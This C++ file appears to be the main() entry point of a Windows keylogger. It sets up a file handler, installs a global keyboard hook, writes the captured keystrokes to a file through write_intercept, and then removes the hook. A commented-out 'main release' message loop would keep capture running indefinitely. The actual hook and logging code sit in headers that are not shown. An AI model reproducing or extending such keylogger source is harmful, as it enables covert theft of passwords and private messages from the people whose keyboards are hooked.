#include <windows.h>
#include <winuser.h>
#include <bits/stdc++.h>

#include "key_hook.h"
#include "file_handler.h"

using namespace std;

int main()
{
    bool check = file_handler::initial();
    if (!check)
        return 0;

    check = key_hook::create_hook();
    if (!check)
        return 0;

    MessageBoxW(NULL, L"\t\tHooking\t\t", L"Close to close XD", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);

    /*
    // in main release
    MSG m;
    while (GetMessage(&m, NULL, 0, 0))
    {
        TranslateMessage(&m);
        DispatchMessage(&m);
    }
    //end main release
    //*/

    check = file_handler::write_intercept(key_proc::captured.str());
    key_proc::captured.str("");

    check = key_hook::delete_hook();
    if (!check)
        return 0;

    return 0;
}
